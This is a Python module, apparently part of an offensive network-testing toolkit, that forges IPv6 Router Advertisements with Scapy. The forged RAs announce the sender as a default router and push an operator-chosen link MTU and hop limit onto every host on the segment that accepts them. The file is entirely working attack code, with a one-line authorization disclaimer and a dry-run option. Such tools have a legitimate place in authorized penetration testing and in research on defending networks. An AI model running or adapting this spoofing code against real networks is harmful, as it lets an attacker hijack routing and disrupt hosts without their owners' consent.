"""SLAAC configuration abuse: change the host parameters that Router Advertisements carry.

Stateless autoconfiguration (RFC 4862) takes more than prefixes from Router Advertisements. An RA also
sets the current hop limit for outgoing packets, and its MTU option sets the link MTU (RFC 4861). Those
values are not authenticated on a plain Ethernet segment. A host that accepts an RA from a sender it
trusts applies whatever values it carries, so a forged RA can lower the MTU or change the hop limit of
every host that accepts it.

This module sends RAs from the operator's MAC, with a router lifetime (so the sender is offered as a
default router), a current hop limit and an MTU option chosen by the operator. The effects to measure
are whether listening hosts apply the MTU and the hop limit, and whether they keep the advertised
values.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import Ether, sendp
from scapy.layers.inet6 import (
    ICMPv6ND_RA,
    ICMPv6NDOptMTU,
    ICMPv6NDOptSrcLLAddr,
    IPv6,
)
from scapy.packet import Packet

from macabre.attacks.common import normalize_unicast_mac
from macabre.attacks.rogue_router_advertisement import (
    ALL_NODES_IP,
    ALL_NODES_MAC,
    MAX_ROUTER_LIFETIME,
    link_local_from_mac,
)

MAX_FRAMES = 100
MIN_MTU = 1280          # IPv6 minimum link MTU (RFC 8200)
MAX_MTU = 65535
MAX_HOP_LIMIT = 255


@dataclass(frozen=True)
class SlaacConfigurationAbuseConfig:
    iface: str                          # attacker interface, on the segment with the victims
    source_mac: str                     # the Ethernet and link-local source MAC (required)
    mtu: int = 1280                     # link MTU the hosts are told to use, at least 1280
    hop_limit: int = 32                 # current hop limit the hosts are told to use, 1 to 255
    router_lifetime: int = 1800         # seconds the sender stays a default router on the host
    frames: int = 3                     # RAs sent, to keep the values fresh
    dry_run: bool = False               # build RAs but do not send them

    def __post_init__(self) -> None:
        normalize_unicast_mac(self.source_mac)
        if not MIN_MTU <= self.mtu <= MAX_MTU:
            raise ValueError(f"MTU must be between {MIN_MTU} and {MAX_MTU} bytes.")
        if not 1 <= self.hop_limit <= MAX_HOP_LIMIT:
            raise ValueError(f"Hop limit must be between 1 and {MAX_HOP_LIMIT}.")
        if not 1 <= self.router_lifetime <= MAX_ROUTER_LIFETIME:
            raise ValueError(f"Router lifetime must be between 1 and {MAX_ROUTER_LIFETIME} seconds.")
        if not 1 <= self.frames <= MAX_FRAMES:
            raise ValueError(f"Frames must be between 1 and {MAX_FRAMES}.")


@dataclass
class SlaacConfigurationAbuseStats:
    frames: int = 0
    status: str = ""


def build_advertisement(config: SlaacConfigurationAbuseConfig) -> Packet:
    """One RA with the chosen current hop limit, a router lifetime, and an MTU option."""
    source = normalize_unicast_mac(config.source_mac)
    return (
        Ether(src=source, dst=ALL_NODES_MAC)
        / IPv6(src=link_local_from_mac(source), dst=ALL_NODES_IP, hlim=255)
        / ICMPv6ND_RA(chlim=config.hop_limit, routerlifetime=config.router_lifetime, reachabletime=0, retranstimer=0)
        / ICMPv6NDOptSrcLLAddr(lladdr=source)
        / ICMPv6NDOptMTU(mtu=config.mtu)
    )


def run_slaac_configuration_abuse(
    config: SlaacConfigurationAbuseConfig,
    stop_event: threading.Event,
    on_progress: Callable[[SlaacConfigurationAbuseStats], None],
    send: Callable[..., Any] | None = None,
) -> SlaacConfigurationAbuseStats:
    """Send `frames` Router Advertisements with the chosen configuration, unless `stop_event` is set first."""
    send = send or sendp

    if config.dry_run:
        stats = SlaacConfigurationAbuseStats(
            status=(
                f"Dry run: would send {config.frames} Router Advertisement(s) with MTU {config.mtu} and hop limit "
                f"{config.hop_limit}. Nothing sent."
            ),
        )
        on_progress(replace(stats))
        return stats

    stats = SlaacConfigurationAbuseStats()
    frame = build_advertisement(config)
    for _ in range(config.frames):
        if stop_event.is_set():
            stats.status = f"Stopped after {stats.frames} advertisement(s)."
            return stats
        send(frame, iface=config.iface, verbose=False)
        stats.frames += 1
        on_progress(replace(stats))
    return stats
